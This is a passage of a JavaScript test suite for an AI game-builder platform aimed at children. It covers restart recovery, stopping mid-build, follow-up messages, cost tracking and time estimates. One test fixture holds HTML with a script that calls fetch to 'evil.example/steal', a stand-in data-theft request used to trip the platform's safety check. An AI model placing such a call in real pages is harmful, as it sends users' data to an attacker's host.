    assert.deepEqual(rows[6], { key: 'think', n: 3, c: 'look', a: 1 });
    assert.deepEqual(rows[7], { key: 'fix', via: 'edit', plan: 'Faster fox', e: 1 });
    assert.deepEqual(rows[9], { key: 'think', n: 4, c: 'next', a: 1 });
  } finally { config.snapshots = false; config.chromiumPath = ''; await snapshot.closeBrowser(); }
});

test('build steps: starting from the ready-made 3D world gives a template row, then the safety check', async () => {
  const u = auth.createUser({ username: 'StepsKid6', password: 'secret1' }); const g = games.createGame(u.id, {});
  const { events, rows } = await stepTurn(u, g, 'make a 3D game with a fox', [
    [{ type: 'tool_use', name: 'start_from_template', input: { template: 'island', notes: 'Started a 3D island' } }],
    [{ type: 'text', text: 'Your 3D island is ready!' }],
  ]);
  assert.deepEqual(rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start', a: 1 }, { key: 'template' }, { key: 'check', st: 'pass', v: 1 }, { key: 'think', n: 2, c: 'next', a: 1 }]);
  assert.ok(idx(events, 'step', s => s.key === 'check') < idx(events, 'version'));
});

// ---- Builds that carry on after a restart, a stop mid-stream, and no model ids in comments (runner.js) ------------
const streamed = () => requests.filter(x => x.body.stream);

test('CL-10 resume: the note says what was already done, the rounds left are honoured, and a Continue quotes the earlier message', async () => {
  const u = auth.createUser({ username: 'ResumeKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  // Handed off after it saved version 1, with 12 of its 14 model calls used.
  const row = turns.create({ gameId: g.id, userId: u.id, status: 'interrupted', request: { text: 'a fox game' }, attempt: 1, chargedDay: today(), provider: 'ai' });
  q.run('UPDATE builder_turns SET model_calls=12 WHERE id=?', row.id);
  appendChat(g.id, u.id, [{ role: 'user', text: 'a fox game', at: Date.now(), turn: row.id }]);
  games.addVersion(g.id, GAME, { notes: 'First version', createdBy: u.id, safetyStatus: 'pass' });
  const before = streamed().length;
  script.push(...Array.from({ length: 6 }, () => [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }]));
  assert.equal(runner.recover().resumed, 1);
  await runner.idle(runner.jobFor(g.id));
  const calls = streamed().slice(before);
  script.length = 0;
  assert.equal(calls.length, 4, 'max(4, 14 - 12) model calls');
  const msgs = calls[0].body.messages; const last = msgs.at(-1);
  assert.equal(last.role, 'user');
  assert.deepEqual(last.content.slice(0, -1), [{ type: 'text', text: 'a fox game' }], 'the message itself, then the note');
  const note = last.content.at(-1).text;
  assert.match(note, /^\[Note from the platform: the server restarted while you were working on this message, so your work was cut off\./);
  assert.match(note, /Already done in this turn: Built version 1: First version \(safety check: pass\)\./);
  assert.match(note, /Don't start over and don't redo finished work\./);
  assert.ok(!msgs.slice(0, -1).some(m => JSON.stringify(m).includes('a fox game')), 'the build\'s own message is not in the history too');
  assert.equal(turns.get(row.id).status, 'done'); assert.equal(turns.get(row.id).attempt, 2); assert.equal(turns.get(row.id).model_calls, 16);

  // Continue after a build that stopped with nothing saved.
  const g2 = games.createGame(u.id, {});
  const old = turns.create({ gameId: g2.id, userId: u.id, status: 'failed', request: { text: 'a dragon game' } });
  q.run("UPDATE builder_turns SET end_reason='restart', can_continue=1, ended_at=? WHERE id=?", Date.now(), old.id);
  script.push([{ type: 'text', text: 'Carrying on!' }]);
  const r = await runTurn({ user: u, gameId: g2.id, text: 'Please carry on with my last message.', continueOf: old.id, emit: () => {} });
  assert.equal(r.ok, true);
  const content = streamed().at(-1).body.messages.at(-1).content;
  assert.equal(content[0].text, 'Please carry on with my last message.');
  assert.match(content.at(-1).text, /The builder pressed Continue after the build stopped early, so carry on with their earlier message: «a dragon game»\./);
  assert.match(content.at(-1).text, /Already done in this turn: nothing saved yet\./);
});

test('CL-11 a stop in the middle of a stream ends the build at once: no more requests, no tools, no "muddled" error', async () => {
  const u = auth.createUser({ username: 'AbortKid', password: 'secret1' }); const g = games.createGame(u.id, {});
  script.push({ hold: 1500, blocks: [{ type: 'text', text: 'Let me build that for you right away.' }, { type: 'tool_use', name: 'write_game', input: { notes: 'First', html: GAME } }] });
  const ac = new AbortController(); const events = []; const before = streamed().length;
  const r = await runTurn({ user: u, gameId: g.id, text: 'a fox game', signal: ac.signal, emit: (n, d) => { events.push([n, d]); if (n === 'text' && !ac.signal.aborted) ac.abort(); } });
  assert.equal(streamed().length - before, 1, 'no more requests');
  assert.deepEqual(events.filter(e => e[0] === 'error'), [], 'a stop is not the Builder getting muddled');
  const done = events.find(e => e[0] === 'done')[1];
  assert.equal(done.end, 'stopped'); assert.equal(done.steps.end, 'stopped');
  assert.equal(games.listVersions(g.id).length, 0, 'the tool after the stop never ran');
  assert.deepEqual([r.ok, r.error], [false, 'stopped']);
  assert.equal(script.length, 0);
  // The cut-off round was still paid for: its input and cache tokens from the first event, its output estimated from
  // what streamed (one 8-character piece, about 2 tokens), on the row and in the free pool.
  const aiBudget = await import('../../server/services/ai-budget.js');
  const want = aiBudget.costOf(config.builderModel, { input_tokens: 100, cache_read_input_tokens: 50, output_tokens: 2 });
  const row = q.get('SELECT usd FROM builder_turns WHERE game_id=? AND charged_day IS NOT NULL', g.id);
  assert.ok(want > 0 && Math.abs(row.usd - want) < 1e-12, `${row.usd} vs ${want}`);
});

test('CL-12 no model identifiers in code comments (code values like config defaults are fine)', async () => {
  const fs = await import('node:fs'); const path = await import('node:path');
  const ROOT = path.resolve(import.meta.dirname, '../..');
  const files = [
    ...fs.readdirSync(path.join(ROOT, 'server'), { recursive: true }).filter(f => f.endsWith('.js')).map(f => path.join(ROOT, 'server', f)),
    ...fs.readdirSync(path.join(ROOT, 'public/js')).filter(f => f.endsWith('.js')).map(f => path.join(ROOT, 'public/js', f)),
  ];
  const MODEL = /\bclaude-[a-z]+-\d|\b(sonnet|opus|haiku)\b/i;
  const even = (s, ch) => (s.split(ch).length - 1) % 2 === 0;
  const bad = [];
  for (const f of files) {
    fs.readFileSync(f, 'utf8').split('\n').forEach((line, k) => {
      let comment = /^\s*(\/\/|\/\*|\*)/.test(line) ? line : null;
      if (!comment) { const m = line.match(/\s\/\/\s.*$/); if (m && ["'", '"', '`'].every(ch => even(line.slice(0, m.index), ch))) comment = m[0]; }
      if (comment && MODEL.test(comment)) bad.push(`${path.relative(ROOT, f)}:${k + 1}: ${line.trim()}`);
    });
  }
  assert.ok(files.length > 50);
  assert.deepEqual(bad, []);
});

// ---- Follow-ups: messages the builder sends while the AI works (runner.js), placed after the tool results.
const fuUser = name => auth.createUser({ username: name, password: 'secret1' });
const fuOf = gameId => loadChat(gameId).messages.filter(m => m.followUp);
async function until(fn, ms = 4000) { const t0 = Date.now(); while (!fn()) { if (Date.now() - t0 > ms) throw new Error('timed out'); await new Promise(r => setTimeout(r, 5)); } }
/** Run a build whose emit adds follow-up text the first time at(name, d) is true. -> { r, events, calls } */
async function fuTurn(u, g, text, rounds, at, fu = 'make it a dragon') {
  script.push(...rounds);
  const before = streamed().length; const events = []; let added = false;
  const r = await runTurn({ user: u, gameId: g.id, text, emit: (n, d) => {
    events.push([n, d]);
    if (!added && at(n, d)) { added = true; runner._acceptScreened(g.id, auth.getUser(u.id), fu); }
  } });
  assert.equal(script.length, 0, 'every scripted round was used');
  return { r, events, calls: streamed().slice(before) };
}
const WRITE = { type: 'tool_use', name: 'write_game', input: { notes: 'A fox', html: GAME } };
const EDIT = { type: 'tool_use', name: 'edit_game', input: { notes: 'A dragon now', edits: [{ find: 'speed: 1', replace: 'speed: 2' }] } };

test('CL-1 a follow-up sent while the AI writes is read next round: its own words, after the tool results, never inside them', async () => {
  const u = fuUser('FuKid1'); const g = games.createGame(u.id, {});
  const { events, calls } = await fuTurn(u, g, 'a fox game', [[WRITE], [EDIT], [{ type: 'text', text: 'Done!' }]], (n, d) => n === 'step' && d.key === 'write');
  assert.equal(calls.length, 3);
  const last = calls[1].body.messages.at(-1);
  assert.equal(last.role, 'user');
  assert.deepEqual(last.content.map(b => b.type), ['tool_result', 'text']);
  assert.deepEqual(last.content[1], { type: 'text', text: 'make it a dragon' });
  assert.doesNotMatch(JSON.stringify(last.content[0]), /dragon/);
  const rows = rowsOf(events);
  assert.deepEqual(rows.find(x => x.key === 'think' && x.n === 2), { key: 'think', n: 2, c: 'msg', m: 1, a: 1 });
  const reading = idx(events, 'inbox', d => d.status === 'reading'), read = idx(events, 'inbox', d => d.status === 'read');
  assert.equal(events[reading][1].n, 2);
  assert.ok(reading < idx(events, 'step', d => d.key === 'think' && d.n === 2), 'handed over, then the round starts');
  assert.ok(read > idx(events, 'step', d => d.key === 'edit'), 'read once the answer is complete');
  assert.ok(read < idx(events, 'version', d => d.number === 2), 'and before its tools run');
  assert.deepEqual(fuOf(g.id).map(m => [m.status, m.by]), [['read', 'ai']]);
  assert.equal(events.find(e => e[0] === 'done')[1].steps.fu, 1);
});

test('CL-2 a reply with no tools goes on when a message is waiting', async () => {
  const u = fuUser('FuKid2'); const g = games.createGame(u.id, {});
  const { calls } = await fuTurn(u, g, 'hello', [[{ type: 'text', text: 'Hi! What game shall we make?' }], [{ type: 'text', text: 'A cat game, yes!' }]], n => n === 'text', 'a cat game');
  assert.equal(calls.length, 2);
  const msgs = calls[1].body.messages;
  assert.equal(msgs.at(-2).role, 'assistant');
  assert.deepEqual(msgs.at(-1), { role: 'user', content: [{ type: 'text', text: 'a cat game' }] });
});

test('CL-3 after ask_user the loop goes on when the answer may be here: the ask_user result, then the message', async () => {
  const u = fuUser('FuKid3'); const g = games.createGame(u.id, {});
  const ASK = { type: 'tool_use', name: 'ask_user', input: { question: 'What kind of game?', options: ['🧺 Catch', '🏃 Runner', '❓ Quiz'] } };
  const { calls, events } = await fuTurn(u, g, 'hello', [[ASK], [{ type: 'text', text: 'A catch game it is!' }]], n => n === 'ask', 'a catch game');
  assert.equal(calls.length, 2);
  const last = calls[1].body.messages.at(-1);
  assert.deepEqual(last.content.map(b => b.type), ['tool_result', 'text']);
  assert.equal(last.content[0].tool_use_id, calls[1].body.messages.at(-2).content[0].id);
  assert.equal(last.content[1].text, 'a catch game');
  assert.equal(events.filter(e => e[0] === 'ask').length, 1);
});

test('CL-4 the rounds run out with a message waiting: the next build starts by itself (1 turn) with only that message', async () => {
  const u = fuUser('FuKid4'); const g = games.createGame(u.id, {});
  const NOTES = [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }];
  const { events, calls } = await fuTurn(u, g, 'a fox game', [...Array.from({ length: 14 }, () => NOTES), [{ type: 'text', text: 'Sure, a dragon!' }]],
    (n, d) => n === 'step' && d.key === 'think' && d.n === 14);
  assert.equal(calls.length, 15);
  const first2 = calls[14].body.messages.at(-1);
  assert.deepEqual(first2, { role: 'user', content: [{ type: 'text', text: 'make it a dragon' }] });
  assert.doesNotMatch(JSON.stringify(calls[14].body.messages), /something for inspiration/);
  assert.deepEqual(events.filter(e => e[0] === 'inbox').map(e => e[1].status), ['waiting', 'carried', 'reading', 'read']);
  assert.equal(rowsOf(events.slice(idx(events, 'inbox', d => d.status === 'carried'))).find(x => x.key === 'think').c, 'msg');
  assert.equal(q.get('SELECT turns FROM builder_usage WHERE user_id=?', u.id).turns, 2);
});

test('CL-5 the safety-fix limit with a message waiting: it carries on into the next build', async () => {
  const u = fuUser('FuKid5'); const g = games.createGame(u.id, {});
  const BAD = '<title>x</title><style>b{}</style><canvas></canvas><script>fetch("https://evil.example/steal")</script>';
  let fixes = 0;
  const { events } = await fuTurn(u, g, 'a fox game', [...[1, 2, 3].map(k => [{ type: 'tool_use', name: 'write_game', input: { notes: `Try ${k}`, html: BAD } }]), [{ type: 'text', text: 'Okay, a dragon!' }]],
    (n, d) => n === 'step' && d.key === 'fix' && ++fixes === 2);
  assert.deepEqual(events.filter(e => e[0] === 'inbox').map(e => e[1].status), ['waiting', 'carried', 'reading', 'read']);
  assert.equal(q.get('SELECT turns FROM builder_usage WHERE user_id=?', u.id).turns, 2);
});

test('CL-6 an error with a message waiting: dropped (error), no more requests', async () => {
  const u = fuUser('FuKid6'); const g = games.createGame(u.id, {});
  const { events, calls } = await fuTurn(u, g, 'a fox game', ['error400'], (n, d) => n === 'step' && d.key === 'think');
  assert.equal(calls.length, 1);
  assert.deepEqual(events.filter(e => e[0] === 'inbox').map(e => e[1]).at(-1), { status: 'dropped', ids: [fuOf(g.id)[0].id], why: 'error' });
  assert.deepEqual([fuOf(g.id)[0].status, fuOf(g.id)[0].why], ['dropped', 'error']);
});

test('CL-7 a refused follow-up never reaches the model', async () => {
  const u = fuUser('FuKid7'); const g = games.createGame(u.id, {});
  script.push({ hold: 600, blocks: [{ type: 'text', text: 'Building your fox. ' }, WRITE] }, [{ type: 'text', text: 'Done!' }]);
  let sent = null;
  const before = streamed().length;
  await runTurn({ user: u, gameId: g.id, text: 'a fox game', emit: n => { if (n === 'text' && !sent) sent = runner.submit({ user: auth.getUser(u.id), game: games.getGame(g.id), text: 'a castle with a dragon', t: tEn }); } });
  const res = await sent;
  await until(() => !runner.isBusy(g.id));
  assert.ok(res.body.refused || res.status === 202, JSON.stringify(res.body));
  assert.doesNotMatch(JSON.stringify(streamed().slice(before).map(x => x.body.messages)), /castle/);
  script.length = 0;
});

test('CL-8 the request stays as it was: same keys, the follow-ups section in the system prompt, and messages only ever appended', async () => {
  const u = fuUser('FuKid8'); const g = games.createGame(u.id, {});
  assert.match(SYSTEM_PROMPT, /# New messages while you work/);
  const { calls } = await fuTurn(u, g, 'a fox game', [[WRITE], [EDIT], [{ type: 'text', text: 'Done!' }]], (n, d) => n === 'step' && d.key === 'write');
  const keys = calls.map(c => Object.keys(c.body).sort().join());
  assert.equal(new Set(keys).size, 1, keys.join(' | '));
  for (const c of calls) { assert.equal(c.body.temperature, undefined); assert.equal(c.body.thinking, undefined); assert.equal(c.body.system[0].text, SYSTEM_PROMPT); }
  for (let k = 1; k < calls.length; k++) assert.deepEqual(calls[k].body.messages.slice(0, calls[k - 1].body.messages.length), calls[k - 1].body.messages, `request ${k + 1} only appends`);
});

test('CL-9 the next build\'s history has the follow-up where it was sent, with user and assistant in turns', async () => {
  const u = fuUser('FuKid9'); const g = games.createGame(u.id, {});
  await fuTurn(u, g, 'a fox game', [[{ type: 'text', text: 'Building! ' }, WRITE], [{ type: 'text', text: 'Dragon done!' }]], (n, d) => n === 'version' && d.number === 1);
  script.push([{ type: 'text', text: 'You are welcome!' }]);
  await runTurn({ user: u, gameId: g.id, text: 'thanks', emit: () => {} });
  const msgs = streamed().at(-1).body.messages;
  const roles = msgs.map(m => m.role);
  assert.ok(roles.every((r, k) => !k || r !== roles[k - 1]), roles.join());
  const flat = msgs.map(m => (typeof m.content === 'string' ? m.content : m.content.map(b => b.text || '').join(' ')));
  const at = flat.findIndex(s => s.includes('make it a dragon'));
  assert.ok(at > 0 && msgs[at].role === 'user');
  assert.match(flat[at - 1], /Built version 1/, 'after what the AI had built when it was sent');
  assert.match(flat[at + 1], /Dragon done!/);
});

test('CL-14 "read" only when the model answered: a failed round drops it (put back); a restart hands it to the resumed attempt', async () => {
  const u = fuUser('FuKid14'); const g = games.createGame(u.id, {});
  const { events } = await fuTurn(u, g, 'a fox game', [[WRITE], 'error400'], (n, d) => n === 'step' && d.key === 'write');
  const st = events.filter(e => e[0] === 'inbox').map(e => e[1].status);
  assert.deepEqual(st, ['waiting', 'reading', 'dropped']);
  assert.deepEqual([fuOf(g.id)[0].status, fuOf(g.id)[0].why], ['dropped', 'error']);
  script.push([{ type: 'text', text: 'Okay!' }]);
  await runTurn({ user: u, gameId: g.id, text: 'thanks', emit: () => {} });
  assert.doesNotMatch(JSON.stringify(streamed().at(-1).body.messages), /make it a dragon/);

  // A restart while the round that carries it is still streaming: the resumed attempt reads it in its round 1.
  const g2 = games.createGame(u.id, {});
  script.push([WRITE], { hold: 3000, blocks: [{ type: 'text', text: 'Ooh, a dragon!' }] }, [{ type: 'text', text: 'Carrying on with the dragon!' }]);
  let added = false;
  const r = await runTurn({ user: u, gameId: g2.id, text: 'a fox game', emit: (n, d) => {
    if (n === 'step' && d.key === 'write' && !added) { added = true; runner._acceptScreened(g2.id, auth.getUser(u.id), 'make it a dragon'); }
    if (n === 'inbox' && d.status === 'reading') setTimeout(() => runner.handOff(), 100);
  } });
  assert.equal(r.error, 'restart');
  assert.equal(fuOf(g2.id)[0].status, 'reading', 'handed over but never answered');
  const ev = [];
  runner.attach(g2.id, { userId: u.id, locale: 'en', compat: false, send: (n, d) => ev.push([n, d]), close() {} });
  assert.equal(runner.recover().resumed, 1);
  const job = runner.jobFor(g2.id);
  await runner.idle(job);
  const first = streamed().at(-1).body.messages.at(-1);
  assert.ok(first.content.some(b => b.type === 'text' && b.text === 'make it a dragon'), 'the resumed attempt\'s first request carries it');
  const reading = idx(ev, 'inbox', d => d.status === 'reading'), read = idx(ev, 'inbox', d => d.status === 'read');
  assert.ok(reading >= 0 && read > reading); assert.equal(ev[reading][1].n, 1);
  assert.ok(read > idx(ev, 'text', d => /Carrying on/.test(d.text)), 'read only after the answer streamed');
  assert.deepEqual([fuOf(g2.id)[0].status, fuOf(g2.id)[0].readTurn], ['read', job.id]);
  assert.equal(script.length, 0);
});

test('CL-13 estimates for the AI: a Pro build is in the Pro bucket with its rounds and tokens; an error still had its estimate', async () => {
  const u = auth.createUser({ username: 'EtaKid1', password: 'secret1' }); const g = games.createGame(u.id, {});
  const row = () => q.get('SELECT * FROM builder_turns WHERE game_id=? ORDER BY created_at DESC, rowid DESC LIMIT 1', g.id);
  script.push(
    [{ type: 'tool_use', name: 'write_game', input: { html: GAME, notes: 'First version' } }],
    [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop'] } }, { type: 'tool_use', name: 'ask_user', input: { question: 'What next?', options: ['Make it harder'] } }],
  );
  const events = [];
  await runTurn({ user: u, gameId: g.id, text: 'a fox jumping game', pro: true, emit: (n, d) => events.push([n, d]) });
  const start = events.find(e => e[0] === 'eta')[1], done = events.find(e => e[0] === 'done')[1];
  assert.deepEqual([start.phase, start.p, start.src, start.show, start.lo, start.hi], ['start', 'ai', 'default', 'range', 2, 4], 'Pro: about 2–4 minutes, a first guess');
  let r = row();
  assert.deepEqual(['est_key', 'kind', 'end_reason', 'versions'].map(k => r[k]), ['ai:pro:new:2d', 'new', 'ok', 1]);
  assert.equal(r.model_calls, done.steps.r); assert.equal(r.model_calls, 2);
  assert.equal(r.tokens_out, done.steps.to); assert.equal(r.tokens_out, 2 * 42, 'what the fake API said it wrote');
  assert.equal(r.eta_hi_ms, 4 * 60e3);
  assert.ok(!/claude|sonnet|opus|haiku/i.test(JSON.stringify(events.filter(e => e[0] === 'eta'))), 'no model name');
  // An error: charged, so it had its estimate; never a sample.
  const err = await stepTurn(u, g, 'make it harder', ['error400']);
  assert.equal(err.events.filter(e => e[0] === 'eta').length, 1);
  r = row();
  assert.deepEqual(['end_reason', 'sample', 'est_key'].map(k => r[k]), ['error', 0, 'ai:std:change:2d']);
});
